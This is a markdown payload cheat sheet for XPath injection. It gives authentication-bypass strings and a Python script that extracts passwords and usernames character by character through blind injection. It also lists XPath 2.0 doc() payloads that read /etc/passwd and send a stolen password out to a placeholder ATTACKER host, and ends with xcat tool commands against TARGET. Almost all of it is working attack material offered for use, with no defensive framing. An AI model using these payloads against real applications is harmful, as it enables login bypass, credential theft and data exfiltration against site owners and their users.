# XPath Injection Payloads

## Authentication Bypass

```
# Typical XPath auth query:
# string(//user[username/text()='USER' and password/text()='PASS']/account/text())

# Always-true injection
Username: ' or '1'='1
Password: ' or '1'='1
# → //user[username/text()='' or '1'='1' and password/text()='' or '1'='1']

# First user login
Username: ' or 1=1 or ''='
Password: anything

# Comment-style (if supported by implementation)
Username: admin' or '1'='1' or '1'='1
Password: anything

# Specific user
Username: admin' or '1'='1
Password: anything' or '1'='1
```

## Data Extraction

### Boolean-Based Blind
```python
import requests
import string

URL = "http://TARGET/login"
TRUE_INDICATOR = "Welcome"

def check(payload):
    r = requests.post(URL, data={"user": payload, "pass": "x"})
    return TRUE_INDICATOR in r.text

# Count nodes
# ' or count(//user)>0 or ''='
# ' or count(//user)>5 or ''='

# Extract node names
# ' or substring(name(//user[1]),1,1)='u' or ''='

# Extract text content character by character
def extract(xpath_expr, max_len=100):
    result = ""
    for pos in range(1, max_len + 1):
        found = False
        for c in string.printable:
            payload = f"' or substring({xpath_expr},{pos},1)='{c}' or ''='"
            if check(payload):
                result += c
                found = True
                print(f"[+] {result}")
                break
        if not found:
            break
    return result

# Extract first user's password
password = extract("//user[1]/password/text()")

# Extract all usernames
for i in range(1, 20):
    username = extract(f"//user[{i}]/username/text()")
    if not username:
        break
    print(f"User {i}: {username}")
```

### String Length Detection
```
# Find length first (optimize extraction)
' or string-length(//user[1]/password/text())=5 or ''='
' or string-length(//user[1]/password/text())>10 or ''='
```

## XPath 2.0 / 3.0 Specific

```
# String functions
' or contains(//user[1]/password/text(),'admin') or ''='
' or starts-with(//user[1]/password/text(),'a') or ''='
' or ends-with(//user[1]/password/text(),'d') or ''='

# Regular expressions (XPath 2.0+)
' or matches(//user[1]/password/text(),'^admin') or ''='

# Tokenize
' or tokenize(//user[1]/password/text(),':')[1]='value' or ''='

# doc() function (XPath 2.0 — file read / SSRF)
' or doc('http://ATTACKER/steal')//x or ''='
' or doc('file:///etc/passwd')//x or ''='
```

## Out-of-Band Extraction

```
# XPath 2.0 doc() function for OOB
' or doc(concat('http://ATTACKER/',//user[1]/password/text())) or ''='

# This makes the server fetch:
# http://ATTACKER/THE_PASSWORD
```

## Common XPath Axes for Enumeration

```
# Navigate the XML tree:
# //user             → all user nodes
# //user[1]          → first user
# //user/child::*    → all children of user nodes
# //user/parent::*   → parent of user nodes
# //user/following-sibling::* → siblings after user
# //*                → all nodes in document
# name(/*)           → root element name
# name(//user[1]/*)  → first child name of user

# Enumeration steps:
# 1. Find root element: ' or name(/*)='root' or ''='
# 2. Count children: ' or count(/root/*)>5 or ''='
# 3. Get child names: ' or substring(name(/root/*[1]),1,1)='u' or ''='
# 4. Recurse deeper into interesting nodes
```

## Tools

```bash
# xcat (XPath exploitation tool)
xcat --method POST --true-string "Welcome" http://TARGET/login "user=*&pass=x" user

# Manual with Burp Suite
# Intruder: fuzz each character position with charset
# Repeater: manual boolean-based extraction
```
